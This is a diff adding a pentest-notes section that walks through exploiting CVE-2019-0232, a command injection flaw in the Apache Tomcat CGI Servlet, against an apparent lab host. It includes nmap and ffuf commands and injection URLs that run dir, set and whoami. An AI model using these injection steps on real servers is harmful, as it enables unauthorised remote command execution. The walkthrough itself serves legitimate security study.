@@ -1582,3 +1582,111 @@ The exploit successfully executes and results in a reverse shell on the GitLab h
 ---
 
 ### Attacking Tomcat CGI
+
+The **Common Gateway Interface (CGI)** allows a web server to execute external programs and return their output to a client. In Apache Tomcat, CGI support is provided through the **CGI Servlet**, which enables Tomcat to execute scripts such as batch (`.bat`) or command (`.cmd`) files on the underlying operating system.
+
+When misconfigured, the Tomcat CGI Servlet can introduce **critical command injection vulnerabilities**, particularly on Windows systems.
+
+Windows systems running Apache Tomcat with the CGI Servlet enabled and the configuration option:
+
+```
+enableCmdLineArguments="true"
+```
+are vulnerable to [CVE-2019-0232](https://nvd.nist.gov/vuln/detail/).
+
+This vulnerability is caused by improper input validation when Tomcat parses the query string and converts it into command-line arguments passed to the CGI script. An attacker can inject arbitrary commands using command separators such as `&`.
+
+Affected versions:
+
+- Tomcat `9.0.0.M1` – `9.0.17`
+- Tomcat `8.5.0` – `8.5.39`
+- Tomcat `7.0.0 – 7.0.93`
+
+This vulnerability results in **unauthenticated remote command execution**.
+
+Begin with a full TCP scan to identify exposed services:
+```bash
+sudo nmap -p- -sV --open 10.129.205.30
+```
+
+The scan reveals Apache Tomcat running on port 8080:
+
+```
+Apache Tomcat 9.0.17
+```
+
+![Filtered output](images/apache-tomcat.PNG)
+
+This version falls within the vulnerable range.
+
+By default, Tomcat CGI scripts are hosted under the `/cgi` directory. Since the target is a **Windows system**, batch (`.bat`) or command (`.cmd`) scripts are likely candidates.
+
+First, attempt to locate `.cmd` files:
+
+```bash
+ffuf -w common.txt:FUZZ -u http://10.129.205.30:8080/cgi/FUZZ.cmd
+```
+
+No results are returned.
+
+Next, fuzz for batch scripts:
+
+```bash
+ffuf -w common.txt:FUZZ -u http://10.129.205.30:8080/cgi/FUZZ.bat
+```
+
+A valid CGI script is discovered:
+
+```
+welcome.bat
+```
+
+![Filtered output](images/apache-tomcat2.PNG)
+
+Navigating to the script:
+
+```
+http://10.129.205.30:8080/cgi/welcome.bat
+```
+
+Returns:
+
+```
+Welcome to CGI, this section is not functional yet. Please return to home page.
+```
+
+This confirms that the script executes but does not perform meaningful logic—ideal for command injection.
+
+To exploit the vulnerability, append a command separator (`&`) to the query string and inject arbitrary commands.
+
+Command Execution Test:
+
+```
+http://10.129.205.30:8080/cgi/welcome.bat?&dir
+```
+
+![Filtered output](images/apache-tomcat3.PNG)
+
+The response confirms successful command execution.
+
+To understand execution context, retrieve environment variables:
+
+```
+http://10.129.205.30:8080/cgi/welcome.bat?&set
+```
+
+![Filtered output](images/apache-tomcat4.PNG)
+
+Notably, the `PATH` environment variable is unset, meaning executables must be referenced using **absolute paths**.
+
+To execute `whoami`, provide the full path and URL-encode special characters:
+
+```
+http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+```
+
+![Filtered output](images/apache-tomcat5.PNG)
+
+This confirms arbitrary command execution under the Tomcat service account.
+
+---
